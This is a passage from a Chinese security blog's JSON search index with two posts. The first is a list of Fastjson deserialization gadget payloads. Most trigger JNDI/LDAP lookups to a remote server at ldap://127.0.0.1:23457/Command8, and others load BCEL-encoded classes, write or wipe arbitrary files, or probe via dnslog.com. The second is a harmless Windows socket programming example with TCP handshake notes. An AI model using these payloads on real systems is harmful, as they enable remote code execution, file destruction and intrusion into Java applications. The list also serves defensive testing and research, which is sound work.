&quot;shareableResources&quot;: [ &quot;ldap://127.0.0.1:23457/Command8&quot; ] &#125;, &quot;adviceBeanName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;,&#123; &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;&#125; WrapperConnectionPoolDataSource 1234&#123; &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;, &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced000...6f;&quot; &#125; JndiRefForwardingDataSource 12345&#123; &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;, &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;loginTimeout&quot;: 0 &#125; InetAddress 1234&#123; &quot;@type&quot;: &quot;java.net.InetAddress&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125; Inet6Address 1234&#123; &quot;@type&quot;: &quot;java.net.Inet6Address&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125; URL 1234&#123; &quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot;&#125; JSONObject 123456789&#123; &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;, &#123; &quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;: &quot;http://dnslog.com&quot; &#125;&#125;&quot;&quot;&#125; URLReader 12345678910&#123; &quot;poc&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONReader&quot;, &quot;reader&quot;: &#123; &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;, &quot;url&quot;: &quot;http://127.0.0.1:9999&quot; &#125; &#125;&#125; AutoCloseable 任意文件写入 123456789101112&#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;, &quot;out&quot;: &#123; &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;, &quot;file&quot;: &quot;/path/to/target&quot; &#125;, &quot;parameters&quot;: &#123; &quot;@type&quot;: &quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;, &quot;filename&quot;: &quot;filecontent&quot; &#125;&#125; BasicDataSource 12345678&#123; &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;, &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;, &quot;driverClassLoader&quot; : &#123; &quot;@type&quot;:&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot; &#125;&#125; JndiConverter 1234&#123; &quot;@type&quot;: &quot;org.apache.xbean.propertyeditor.JndiConverter&quot;, &quot;AsText&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; JtaTransactionConfig 1234567&#123; &quot;@type&quot;: &quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;, &quot;properties&quot;: &#123; &quot;@type&quot;: &quot;java.util.Properties&quot;, &quot;UserTransaction&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;&#125; JndiObjectFactory 1234&#123; &quot;@type&quot;: &quot;org.apache.shiro.jndi.JndiObjectFactory&quot;, &quot;resourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; AnterosDBCPConfig 1234&#123; &quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; AnterosDBCPConfig2 1234&#123; &quot;@type&quot;: &quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; CacheJndiTmLookup 1234&#123; &quot;@type&quot;: &quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; AutoCloseable 清空指定文件 123456&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false&#125; AutoCloseable 清空指定文件 123456&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileWriter&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false&#125; AutoCloseable 任意文件写入 1234567891011121314151617181920212223242526272829&#123; &quot;stream&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;, &quot;file&quot;:&quot;/tmp/nonexist&quot;, &quot;append&quot;:false &#125;, &quot;writer&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.apache.solr.common.util.FastOutputStream&quot;, &quot;tempBuffer&quot;:&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;, &quot;sink&quot;: &#123; &quot;$ref&quot;:&quot;$.stream&quot; &#125;, &quot;start&quot;:38 &#125;, &quot;close&quot;: &#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.iq80.snappy.SnappyOutputStream&quot;, &quot;out&quot;: &#123; &quot;$ref&quot;:&quot;$.writer&quot; &#125; &#125;&#125; BasicDataSource 12345678&#123; &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;, &quot;driverClassName&quot;: &quot;true&quot;, &quot;driverClassLoader&quot;: &#123; &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot; &#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;com.zaxxer.hikari.HikariConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;, &quot;metricRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; HikariConfig 1234&#123; &quot;@type&quot;: &quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;, &quot;healthCheckRegistry&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; SessionBeanProvider 12345&#123; &quot;@type&quot;: &quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;, &quot;jndiName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;, &quot;Object&quot;: &quot;su18&quot;&#125; JMSContentInterceptor 123456789&#123; &quot;@type&quot;: &quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123; &quot;@type&quot;: &quot;java.util.Hashtable&quot;, &quot;java.naming.factory.initial&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;, &quot;topic-factory&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot; &#125;, &quot;namespace&quot;: &quot;&quot;&#125; ContextClassLoaderSwitcher 123456789&#123; &quot;@type&quot;: &quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;, &quot;contextClassLoader&quot;: &#123; &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;a&quot;: &#123; &quot;@type&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot; &#125;&#125; OracleManagedConnectionFactory 1234&#123; &quot;@type&quot;: &quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;, &quot;xaDataSourceName&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125; JNDIConfiguration 1234&#123; &quot;@type&quot;: &quot;org.apache.commons.configuration.JNDIConfiguration&quot;, &quot;prefix&quot;: &quot;ldap://127.0.0.1:23457/Command8&quot;&#125;","categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"windows下socket通信","slug":"windows下socket通信","date":"2022-07-31T13:16:50.000Z","updated":"2022-09-01T00:56:19.248Z","comments":true,"path":"2022/07/31/windows下socket通信/","link":"","permalink":"http://example.com/2022/07/31/windows%E4%B8%8Bsocket%E9%80%9A%E4%BF%A1/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142server.c#include &lt;stdio.h&gt;#include &lt;winsock2.h&gt;#pragma comment (lib, &quot;ws2_32.lib&quot;) //加载 ws2_32.dll int main()&#123; //初始化 DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //创建套接字 SOCKET servSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //绑定套接字 struct sockaddr_in sockAddr; memset(&amp;sockAddr, 0, sizeof(sockAddr)); //每个字节都用0填充 sockAddr.sin_family = PF_INET; //使用IPv4地址 sockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); //具体的IP地址 sockAddr.sin_port = htons(1234); //端口 bind(servSock, (SOCKADDR*)&amp;sockAddr, sizeof(SOCKADDR)); //进入监听状态 listen(servSock, 20); //接收客户端请求 SOCKADDR clntAddr; int nSize = sizeof(SOCKADDR); SOCKET clntSock = accept(servSock, (SOCKADDR*)&amp;clntAddr, &amp;nSize); //向客户端发送数据 char *str = &quot;Hello World!&quot;; send(clntSock, str, strlen(str) + sizeof(char), 0); //关闭套接字 closesocket(clntSock); closesocket(servSock); //终止 DLL 的使用 WSACleanup(); return 0;&#125; 1234567891011121314151617181920212223242526272829303132333435363738client.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;WinSock2.h&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;) //加载 ws2_32.dll int main()&#123; //初始化DLL WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), &amp;wsaData); //创建套接字 SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); //向服务器发起请求 struct sockaddr_in sockAddr; memset(&amp;sockAddr, 0, sizeof(sockAddr)); //每个字节都用0填充 sockAddr.sin_family = PF_INET; sockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); sockAddr.sin_port = htons(1234); connect(sock, (SOCKADDR*)&amp;sockAddr, sizeof(SOCKADDR)); //接收服务器传回的数据 char szBuffer[MAXBYTE] = &#123; 0 &#125;; recv(sock, szBuffer, MAXBYTE, NULL); //输出接收到的数据 printf(&quot;Message form server: %s\\n&quot;, szBuffer); //关闭套接字 closesocket(sock); //终止使用 DLL WSACleanup(); system(&quot;pause&quot;); return 0;&#125; 分别编译server.c&amp;client.c，先运行server.exe创建server端，后运行client.exe，可得结果如下 wireshark抓包分析 根据SYN,ACK标识可以看到serve和client端三次握手建立TCP连接 根据PSH,ACK标识以及Len&#x3D;13可以看到serve和client端进行数据交互，传输了13个字符 根据FIN,ACK标识可以看到serve和client端四次挥手，断开TCP连接 这里再简单复习一下三次握手，四次挥手 1234567891011121314151617181920三次握手：刚开始客户端处于 closed 的状态，服务端处于 listen 状态。然后1、第一次握手：客户端给服务端发一个 SYN 报文，并指明客户端的初始化序列号 ISN（c）。此时客户端处于 SYN_Send 状态。2、第二次握手：服务器收到客户端的 SYN 报文之后，会以自己的 SYN 报文作为应答，并且也是指定了自己的初始化序列号 ISN(s)，同时会把客户端的 ISN + 1 作为 ACK 的值，表示自己已经收到了客户端的 SYN，此时服务器处于 SYN_REVD 的状态。3、第三次握手：客户端收到 SYN 报文之后，会发送一个 ACK 报文，当然，也是一样把服务器的 ISN + 1 作为 ACK 的值，表示已经收到了服务端的 SYN 报文，此时客户端处于 establised 状态。4、服务器收到 ACK 报文之后，也处于 establised 状态，此时，双方以建立起了链接。四次挥手：1、第一次挥手：客户端发送一个 FIN 报文，报文中会指定一个序列号。此时客户端处于FIN_WAIT1状态。2、第二次握手：服务端收到 FIN 之后，会发送 ACK 报文，且把客户端的序列号值 + 1 作为 ACK 报文的序列号值，表明已经收到客户端的报文了，此时服务端处于 CLOSE_WAIT状态。3、第三次挥手：如果服务端也想断开连接了，和客户端的第一次挥手一样，发给 FIN 报文，且指定一个序列号。此时服务端处于 LAST_ACK 的状态。4、第四次挥手：客户端收到 FIN 之后，一样发送一个 ACK 报文作为应答，且把服务端的序列号值 + 1 作为自己 ACK 报文的序列号值，此时客户端处于 TIME_WAIT 状态。需要过一阵子以确保服务端收到自己的 ACK 报文之后才会进入 CLOSED 状态5、服务端收到 ACK 报文之后，就处于关闭连接了，处于 CLOSED 状态。","categories":[{"name":"windows逆向","slug":"windows逆向","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91/"},{"name":"编程","slug":"windows逆向/编程","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"二进制","slug":"二进制","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"windows编程","slug":"windows编程","permalink":"http://example.com/tags/windows%E7%BC%96%E7%A8%8B/"}]}],"categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"},{"name":"docker","slug":"docker","permalink":"http://example.com/categories/docker/"},{"name":"红蓝攻防","slug":"红蓝攻防","permalink":"http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/"},{"name":"恶意代码","slug":"恶意代码","permalink":"http://example.com/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"windows逆向","slug":"windows逆向","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91/"},{"name":"编程","slug":"windows逆向/编程","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"},{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"},{"name":"攻防","slug":"攻防","permalink":"http://example.com/tags/%E6%94%BB%E9%98%B2/"},{"name":"恶意代码","slug":"恶意代码","permalink":"http://example.com/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"二进制","slug":"二进制","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"java框架","slug":"java框架","permalink":"http://example.com/tags/java%E6%A1%86%E6%9E%B6/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"windows编程","slug":"windows编程","permalink":"http://example.com/tags/windows%E7%BC%96%E7%A8%8B/"}]}